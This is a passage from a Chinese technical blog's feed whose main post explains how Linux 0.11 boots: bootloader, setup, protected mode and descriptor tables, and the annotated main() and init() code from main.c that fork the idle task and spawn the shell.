&lt;p&gt;如果要达到单核多任务的目的，首先要做的就是完成对几组寄存器中当前值的保存(我称之为保存现场)。而对于内存来说，多个任务的代码、数据同时存在内存是完全合理且可行的。毕竟相较于有限的寄存器，内存实在是太大了(相对而言)。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="time interrupt" scheme="https://DorMOUSE-None.github.io/tags/time-interrupt/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (3) - 操作系统启动</title>
    <link href="https://DorMOUSE-None.github.io/2018-10-06-understand-Kernel-3/"/>
    <id>https://DorMOUSE-None.github.io/2018-10-06-understand-Kernel-3/</id>
    <published>2018-10-05T16:00:00.000Z</published>
    <updated>2018-10-06T11:26:56.685Z</updated>
    
    <content type="html"><![CDATA[<p>这次拖得有够久的，毕竟需要将知识串联起来并不是一件容易的事情。更何况很多内容可以说和常理(个人理解的常理)有了比较大的偏差。</p><p>不过确实比较有意思。从引导程序到操作系统启动，这中间究竟经历了多少流程呢？</p><p>由于有了前几节的内容，这里不会再对引导程序及汇编语法做过多的介绍。而着重在于整个流程的描述。</p><a id="more"></a><h2 id="引导程序"><a href="#引导程序" class="headerlink" title="引导程序"></a>引导程序</h2><p>从 BIOS 将512字节长的引导程序加载到物理内存<code>0x7c00</code>开始的连续递增空间后，即将程序的执行权交给了引导程序(这里指的执行权可以简单理解成CS:IP)</p><blockquote><p><em>CS:IP</em></p><p><strong>CS</strong>. 代码段基址。一般用于划定一段连续代码开始的地址。是一个16位段寄存器，类似的还有 DS, ES, FS, GS, SS 等16位段寄存器，分别提供不同的段基址存储功能)<br><strong>IP</strong>. 代码段偏移值。配合 CS 共同为 CPU 确定下一个将要被执行的机器指令的线性地址。</p></blockquote><p>Linux 0.11 版本的引导程序实现的支持比较简单。</p><ol><li>将引导程序代码(自身) 512 字节的内容移动到 <code>0x90000</code> 开始的 512B 内存空间上</li><li>跳到 <code>0x90000</code> 开始的段的相应位置继续执行</li><li>从磁盘中读取 4*512 字节的 setup 程序的二进制内容</li><li>读取操作系统的二进制内容到内存 <code>0x10000</code> 开始的连续地址空间中 (此处最大可以有 0x90000 - 0x10000 = 0x80000 = 512 KB，即当时的操作系统二进制程序+数据最大只能是 512KB, 不过也很多了)</li><li>确认将要作为文件系统的磁盘是否存在</li><li>将控制权交给 setup 程序</li></ol><h2 id="SETUP-程序"><a href="#SETUP-程序" class="headerlink" title="SETUP 程序"></a>SETUP 程序</h2><p><strong>读取硬件配置</strong></p><p>setup 程序，顾名思义，就是在搞一些配置。那么究竟在配置什么？</p><p>就是通过 BIOS 中断读取各种硬件信息(诸如内存大小，显示器长宽比，磁盘等)，并将它们存储在内存的指定位置。</p><p>哈哈，由于引导程序已经执行完了，再也不会使用了。因此，setup 程序就是将这些信息存储到了原引导程序所在的位置，即 0x90000 ~ 0x901FF 共 512 B 的内存中。</p><p>当然，每个字节存的是什么内容都是一种约定(比如 setup 程序把内存大小的信息存到了哪，后面其它程序就到相应的位置去取)。</p><p><strong>移动操作系统程序</strong></p><p>OK，setup 程序也不是仅仅只干这么点事情的，不然要 4*512 字节岂不是太浪费了，哪用得了这么多。</p><p>setup 还要负责将操作系统程序移动到<em>方便</em>的位置。前面将操作系统程序加载到了内存 0x10000 处，主要是为了暂时保持 BIOS 中断向量表 (位于 0x0000 开始的连续 1024 B 内存中，由 BIOS 程序创建，用于各种中断调用) 。在 setup 决定不再使用 BIOS 中断之后，就已经可以完全废弃了。</p><p>因此，操作系统程序将从 0x10000 顺次移动到 0x00000 的位置。</p><p><strong>重置中断</strong></p><p>软中断与硬中断，应该是在软硬件划分下唯二的两种中断形式。软中断一般通过汇编指令 <code>INT {中断号}</code> 的形式通过软件执行的形式产生，而硬中断是硬件由于某些错误指令而自动产生的中断。</p><p>当然，这些中断都需要 CPU 进行相应的处理。那么，在 BIOS  中断向量表被覆盖了之后，如何来处理这些中断呢？</p><p>首先，在上一步 <strong>移动操作系统程序</strong> 开始时，就直接通过汇编指令 <code>cli</code> 强制禁止除 <em>非可屏蔽中断</em> 外的所有中断，因此也就基本不考虑中断的问题。</p><p>但是，总还得解除禁止吧。因此，setup 程序尽快地重新编制了硬件中断，进入保护模式。使用保护模式下的中断描述符表来替代 BIOS 中断向量表。</p><p>至于如何创建中断描述符表，哈哈，这都是直接在汇编编程的时候写好的。直接划出了一块区域写上了中断描述符表的表项，然后与 setup 代码一起被读取到了内存的指定位置。至于唯一要做的，就是将 IDTR (中断描述符表寄存器) 修改为中断描述符表在内存的开始地址。</p><p><strong>进入保护模式</strong></p><p>首先，简单介绍一下实模式 &amp; 保护模式。</p><p>保护模式与实模式的主要区别，就在于两者的内存寻址方式，归根结底也就是段寄存器如何辅助完成内存地址定位的问题。</p><p>先简单的回顾下实模式下的寻址方式</p><p>段寄存器的出现，很大程度上是为了对 16 bit CPU 下可寻址地址不足所作出的补充。<br>诸如 CS:IP = 0x07C0:0x0001 -&gt; 0x07C01 。通过CS:IP 的配合，物理地址 = CS &lt;&lt; 4 + IP ，将原本 128 KB 的可寻址空间扩展到 0xFFFF:0xFFFF -&gt; 0x10FFFE 的寻址空间</p><p>而保护模式的出现，也是由于实模式下的地址寻址仍然不能满足对内存寻址的需求。</p><p>那么保护模式究竟将如何进行寻址呢？简单来说就是通过新增了一个寄存器 GDTR (全局描述符表寄存器。当然，暂时不考虑 LDTR) 用来存储全局描述符表(全局描述符表是一些在内存中的有结构的数据) ，那么类似的，本来是段寄存器中是表示一个内存段基址，现在通过借助中间项 (GDTR) ，由全局描述符表的每一个表项来表示每一个内存段基址，从而达到在最大 4GB 的内存中进行内存地址的寻址。</p><p>而与上面的中断描述符表类似的，全局描述符表也是以同样的方式，预先写好，然后设置一下 GDTR 就 OK 了。</p><p><strong>转入操作系统程序</strong></p><p>最后的最后，当然是把控制权交给操作系统程序。即跳转到内存 0x00000 处。当然，由于现在已经处于保护模式下，因此 jmp 指令略有不同。 为 <code>jmpi 0, 8</code>。</p><p>简单解释一下这一条指令 </p><p><code>jmpi</code> 指令表示进行段间跳转。(段间跳转与段内跳转的区别在于: 程序代码的寻址一般通过 CS:IP 配合完成，如果是段内跳转，则段基址不变，即 CS 不变，只需要给出 IP 即可；而段间跳转需要同时给出新的段基址(CS)和新的段偏移(IP)。</p><p><code>0</code> 这里 0 就表示的是段偏移。</p><p><code>8</code> 保护模式下的段寄存器以一种特殊的方式来配合 GDTR/LDTR 来完成对全局/局部描述符表项的定位。如下图所示。最后两位表示特权级，用于区分用户态(11) or 内核态(00) (Linux 只使用了两个，还有 01 和 10 不使用)</p><p>第三位表示使用 GDTR 还是 LDTR</p><p>高 13 位共同组成了对 GDTR/LDTR 表项的描述，究竟使用哪一个表项。当然，这里其实也侧面反映了，其实每个全局描述符表/局部描述符表最多只能有 $2^{13} = 8192$ 个表项。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fulm7vumywj31220aw74f.jpg" alt=""></p><h2 id="操作系统程序"><a href="#操作系统程序" class="headerlink" title="操作系统程序"></a>操作系统程序</h2><p>终于要到操作系统程序了。这个就比较复杂了。这里只简单描述将操作系统启动起来的最基本使用到的代码。其它以后继续。</p><p>其实整一个操作系统程序是一个比较大的量，毕竟最大能够达到 512 KB 呢。</p><p>简单的看一下文档树，见附录一，编译前的源代码文件总计 100 多个。</p><p>首先被执行的是 head.s 中的代码，这里完成的工作主要包括:</p><ol><li><p>重新编制每个中断的具体处理代码(这个应该比较好理解，说到底中断出现了，也还是要通过实现代码来完成中断逻辑。不论是 BIOS 中断向量还是保护模式下使用的中断描述符表，都不过是记录了一下中断处理代码的位置，进行了定位而已)。</p></li><li><p>初始化分页模式(不详述，以后有机会在说)</p></li><li><p>验证 80387 数学协处理器。</p></li><li><p>进入 main.c 程序 (既然 Linus 都将其命名为 main 了，那么显然这是整个操作系统最核心的部分了)。</p></li></ol><h3 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h3><p>下面将简单给出 main.c 程序的两段代码 <code>main(...)</code> 和 <code>init(...)</code>，并直接针对代码进行直接解释。</p><h4 id="main-void"><a href="#main-void" class="headerlink" title="main(void)"></a>main(void)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ROOT_DEV = ORIG_ROOT_DEV;   <span class="comment">// 读取在引导程序执行时获取到的文件系统所在的磁盘</span></span><br><span class="line"> drive_info = DRIVE_INFO;</span><br><span class="line">memory_end = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>) + (EXT_MEM_K&lt;&lt;<span class="number">10</span>); <span class="comment">// 首先先确认整个内存的大小</span></span><br><span class="line">memory_end &amp;= <span class="number">0xfffff000</span>;               <span class="comment">// 当然，这里为了分页方便 (每页 4096 B)，直接将不满一页的内存忽略掉了</span></span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>)          <span class="comment">// 最大支持 16 MB 的内存，这里是 Linus 当时的机器只有 16 MB，因此没有做更大内存的支持，但可以自己去改源码</span></span><br><span class="line">memory_end = <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">12</span>*<span class="number">1024</span>*<span class="number">1024</span>)          <span class="comment">// 确认缓存区的末地址 (根据实际内存大小调整, &gt;12MB 留 4MB 缓存，&gt;6MB 留 2 MB 缓存，否则 1MB )</span></span><br><span class="line">buffer_memory_end = <span class="number">4</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (memory_end &gt; <span class="number">6</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">buffer_memory_end = <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buffer_memory_end = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">main_memory_start = buffer_memory_end;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RAMDISK</span></span><br><span class="line">main_memory_start += rd_init(main_memory_start, RAMDISK*<span class="number">1024</span>);      <span class="comment">// 如果需要虚拟盘，则再留一部分作为交换区</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">mem_init(main_memory_start,memory_end); <span class="comment">// 内存初始化，毕竟 Linux 操作系统下的所有内存都将被统一分配，用户程序没有权限随便使用内存，只能用被分配的</span></span><br><span class="line">trap_init();            <span class="comment">// 初始化中断</span></span><br><span class="line">blk_dev_init();         <span class="comment">// 初始化块设备</span></span><br><span class="line">chr_dev_init();         <span class="comment">// 初始化字符设备</span></span><br><span class="line">tty_init();             <span class="comment">// 初始化 tty</span></span><br><span class="line">time_init();            <span class="comment">// 设置开机启动时间</span></span><br><span class="line">sched_init();           <span class="comment">// 初始化任务调度程序，由此就将可以进行多任务切换了</span></span><br><span class="line">buffer_init(buffer_memory_end); <span class="comment">// 缓存区初始化</span></span><br><span class="line">hd_init();              <span class="comment">// 硬盘初始化</span></span><br><span class="line">floppy_init();          <span class="comment">// 软盘初始化</span></span><br><span class="line">sti();                  <span class="comment">// 不再禁止中断，现在开始又允许中断了</span></span><br><span class="line">move_to_user_mode();    <span class="comment">// 进入用户态</span></span><br><span class="line"><span class="keyword">if</span> (!fork()) &#123;          <span class="comment">// 关于 fork 函数，下面将简单介绍。</span></span><br><span class="line">init();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(;;) pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fork()</strong></p><p>如果熟悉 C 语言，应该对 fork() 也比较熟悉吧。这将执行一次系统调用，最终的结果是，创建一个新的任务 (这里将原来的操作系统程序认为是 0 号进程/任务，将产生 1 号进程/任务)。新的任务与原有任务几乎一模一样，除了 fork() 调用的返回值不同。子任务将返回 0 ，原有任务将返回子任务的任务号。</p><p>因此，对于上面的代码，<code>if(!fork())</code> ，0号任务将不执行 <code>if(){}</code> 语句块内的 init ，而 1 号任务将执行 <code>init()</code> 函数</p><p>而 0 号进程在做什么呢? </p><p>很简单，下面 <code>for(;;) pause();</code>。 <code>pause()</code> 是指让 CPU 完全停止，只有发生硬件中断， CPU 才会从停止状态中恢复 (前面已经设置了定时的/ 10ms/次的时钟中断，因此 CPU 总是能够恢复)， </p><p>具体的描述就是，如果任务调度程序把时间片分配给了 0 号进程，那么 0 号进程唯一做的，就是让 CPU 停止。而且 0 号进程的 <code>for</code> 是死循环，每次把时间分配给 0 号进程，它就 CPU 停止。我们在 Linux 操作系统上，通过 top 可以看到对 cpu 有如下描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br></pre></td></tr></table></figure><p>其中对 idle(id) 的统计，其实就在 0 号任务让 cpu 停止工作了而已。</p><h4 id="init-void"><a href="#init-void" class="headerlink" title="init(void)"></a>init(void)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid,i;</span><br><span class="line"></span><br><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);</span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">"/dev/tty0"</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d buffers = %d bytes buffer space\n\r"</span>,NR_BUFFERS,</span><br><span class="line">NR_BUFFERS*BLOCK_SIZE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Free mem: %d bytes\n\r"</span>,memory_end-main_memory_start);</span><br><span class="line"><span class="keyword">if</span> (!(pid=fork())) &#123;</span><br><span class="line">close(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (open(<span class="string">"/etc/rc"</span>,O_RDONLY,<span class="number">0</span>))</span><br><span class="line">_exit(<span class="number">1</span>);</span><br><span class="line">execve(<span class="string">"/bin/sh"</span>,argv_rc,envp_rc);</span><br><span class="line">_exit(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span> (pid != wait(&amp;i))</span><br><span class="line"><span class="comment">/* nothing */</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((pid=fork())&lt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fork failed in init\r\n"</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">close(<span class="number">0</span>);close(<span class="number">1</span>);close(<span class="number">2</span>);</span><br><span class="line">setsid();</span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">"/dev/tty0"</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">_exit(execve(<span class="string">"/bin/sh"</span>,argv,envp));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> (pid == wait(&amp;i))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\rchild %d died with code %04x\n\r"</span>,pid,i);</span><br><span class="line">sync();</span><br><span class="line">&#125;</span><br><span class="line">_exit(<span class="number">0</span>);<span class="comment">/* NOTE! _exit, not exit() */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么 1 号任务在做什么呢？看 init 的代码，可以看到大量诸如 <code>/dev/tty0</code>, <code>/bin/sh</code> 的代码。哈哈，下面通过 1,2,3… 对步骤进行标号简单描述一下。</p><ol><li><p>1 号进程在做的是 fork 出新的进程(暂时叫它进程 X )</p></li><li><p>1 号进程不断询问 X 是否被销毁 </p><ul><li>如果 X 进程被销毁了：那么继续执行步骤 1</li><li>否则：继续执行步骤 2 （为什么会出现不断循环呢？其实由于任务调度程序的存在，在单个 CPU 看来，这个轮询并不一直发生，有一些时间片已经给了其他进程继续执行任务了</li></ul></li><li><p>X 任务通过调用 <code>execve()</code> 把当前程序的代码+数据全部替换成是 shell 的 (其实大量的用户程序都是通过这种 fork + execve 的形式出现的)</p></li><li>X 任务(也就是 Shell 程序) 开始通过 tty 与用户开始交互。直到用户选择 <code>exit</code> 退出 shell </li></ol><p><strong>execve(…)</strong></p><p>前面介绍过 fork 是复制一份程序的各个寄存器的状态 + 程序的数据。现在 execve 做出的操作是直接将当前程序的代码和数据替换成目标程序的代码和数据，并通过对寄存器一定的重置，完成一个用户程序的启动流程(程序启动说到底不就是在内存中存在这个程序的代码，然后通过 CS:IP 定位到即将执行的程序指令，最后让 CPU 开始执行就 OK 了)</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>整个操作系统的启动流程就简单地介绍到这里。</p><p>0 号任务作为操作系统的常驻程序，在 OS 启动完成，每次时间片被分配给它，它就让 CPU 停止工作(通过 pause() 系统调用)</p><p>1 号任务作为操作系统的常驻程序，唯一的任务就是判断进程X是否被退出，如果退出了，就重新创建一个(当然，也可能有人有疑问，为什么现在的 Linux 开多个 bash 都没有问题呢? 这里有个猜测是有一个隐藏的 shell 是被 1 号任务启动的，其它的 bash 是多余的。不过这只是猜测，待考察)</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="附录一"><a href="#附录一" class="headerlink" title="附录一"></a>附录一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|-- Makefile</span><br><span class="line">|-- boot</span><br><span class="line">|   |-- head.s</span><br><span class="line">|-- fs</span><br><span class="line">|   |-- Makefile</span><br><span class="line">|   |-- bitmap.c</span><br><span class="line">|   |-- block_dev.c</span><br><span class="line">|   |-- buffer.c</span><br><span class="line">|   |-- char_dev.c</span><br><span class="line">|   |-- exec.c</span><br><span class="line">|   |-- fcntl.c</span><br><span class="line">|   |-- file_dev.c</span><br><span class="line">|   |-- file_table.c</span><br><span class="line">|   |-- inode.c</span><br><span class="line">|   |-- ioctl.c</span><br><span class="line">|   |-- namei.c</span><br><span class="line">|   |-- open.c</span><br><span class="line">|   |-- pipe.c</span><br><span class="line">|   |-- read_write.c</span><br><span class="line">|   |-- stat.c</span><br><span class="line">|   |-- super.c</span><br><span class="line">|   `-- truncate.c</span><br><span class="line">|-- include</span><br><span class="line">|   |-- a.out.h</span><br><span class="line">|   |-- asm</span><br><span class="line">|   |   |-- io.h</span><br><span class="line">|   |   |-- memory.h</span><br><span class="line">|   |   |-- segment.h</span><br><span class="line">|   |   `-- system.h</span><br><span class="line">|   |-- const.h</span><br><span class="line">|   |-- ctype.h</span><br><span class="line">|   |-- errno.h</span><br><span class="line">|   |-- fcntl.h</span><br><span class="line">|   |-- linux</span><br><span class="line">|   |   |-- config.h</span><br><span class="line">|   |   |-- fdreg.h</span><br><span class="line">|   |   |-- fs.h</span><br><span class="line">|   |   |-- hdreg.h</span><br><span class="line">|   |   |-- head.h</span><br><span class="line">|   |   |-- kernel.h</span><br><span class="line">|   |   |-- mm.h</span><br><span class="line">|   |   |-- sched.h</span><br><span class="line">|   |   |-- sys.h</span><br><span class="line">|   |   `-- tty.h</span><br><span class="line">|   |-- signal.h</span><br><span class="line">|   |-- stdarg.h</span><br><span class="line">|   |-- stddef.h</span><br><span class="line">|   |-- string.h</span><br><span class="line">|   |-- sys</span><br><span class="line">|   |   |-- stat.h</span><br><span class="line">|   |   |-- times.h</span><br><span class="line">|   |   |-- types.h</span><br><span class="line">|   |   |-- utsname.h</span><br><span class="line">|   |   `-- wait.h</span><br><span class="line">|   |-- termios.h</span><br><span class="line">|   |-- time.h</span><br><span class="line">|   |-- unistd.h</span><br><span class="line">|   `-- utime.h</span><br><span class="line">|-- init</span><br><span class="line">|   |-- main.c</span><br><span class="line">|-- kernel</span><br><span class="line">|   |-- Makefile</span><br><span class="line">|   |-- asm.o</span><br><span class="line">|   |-- asm.s</span><br><span class="line">|   |-- blk_drv</span><br><span class="line">|   |   |-- Makefile</span><br><span class="line">|   |   |-- blk.h</span><br><span class="line">|   |   |-- floppy.c</span><br><span class="line">|   |   |-- hd.c</span><br><span class="line">|   |   |-- ll_rw_blk.c</span><br><span class="line">|   |   `-- ramdisk.c</span><br><span class="line">|   |-- chr_drv</span><br><span class="line">|   |   |-- Makefile</span><br><span class="line">|   |   |-- console.c</span><br><span class="line">|   |   |-- keyboard.S</span><br><span class="line">|   |   |-- rs_io.s</span><br><span class="line">|   |   |-- serial.c</span><br><span class="line">|   |   |-- tty_io.c</span><br><span class="line">|   |   `-- tty_ioctl.c</span><br><span class="line">|   |-- exit.c</span><br><span class="line">|   |-- fork.c</span><br><span class="line">|   |-- fork.i</span><br><span class="line">|   |-- math</span><br><span class="line">|   |   |-- Makefile</span><br><span class="line">|   |   `-- math_emulate.c</span><br><span class="line">|   |-- mktime.c</span><br><span class="line">|   |-- panic.c</span><br><span class="line">|   |-- printk.c</span><br><span class="line">|   |-- sched.c</span><br><span class="line">|   |-- sched.o</span><br><span class="line">|   |-- signal.c</span><br><span class="line">|   |-- sys.c</span><br><span class="line">|   |-- system_call.o</span><br><span class="line">|   |-- system_call.s</span><br><span class="line">|   |-- traps.c</span><br><span class="line">|   |-- traps.o</span><br><span class="line">|   `-- vsprintf.c</span><br><span class="line">|-- lib</span><br><span class="line">|   |-- Makefile</span><br><span class="line">|   |-- _exit.c</span><br><span class="line">|   |-- close.c</span><br><span class="line">|   |-- ctype.c</span><br><span class="line">|   |-- dup.c</span><br><span class="line">|   |-- errno.c</span><br><span class="line">|   |-- execve.c</span><br><span class="line">|   |-- malloc.c</span><br><span class="line">|   |-- open.c</span><br><span class="line">|   |-- setsid.c</span><br><span class="line">|   |-- string.c</span><br><span class="line">|   |-- wait.c</span><br><span class="line">|   `-- write.c</span><br><span class="line">|-- mm</span><br><span class="line">|   |-- Makefile</span><br><span class="line">|   |-- memory.c</span><br><span class="line">|   `-- page.s</span><br><span class="line">`-- tools</span><br><span class="line">    `-- build.c</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次拖得有够久的，毕竟需要将知识串联起来并不是一件容易的事情。更何况很多内容可以说和常理(个人理解的常理)有了比较大的偏差。&lt;/p&gt;
&lt;p&gt;不过确实比较有意思。从引导程序到操作系统启动，这中间究竟经历了多少流程呢？&lt;/p&gt;
&lt;p&gt;由于有了前几节的内容，这里不会再对引导程序及汇编语法做过多的介绍。而着重在于整个流程的描述。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="OS" scheme="https://DorMOUSE-None.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>Understand MAIL</title>
    <link href="https://DorMOUSE-None.github.io/2018-09-27-mail/"/>
    <id>https://DorMOUSE-None.github.io/2018-09-27-mail/</id>
    <published>2018-09-26T16:00:00.000Z</published>
    <updated>2018-09-28T10:10:21.579Z</updated>
    
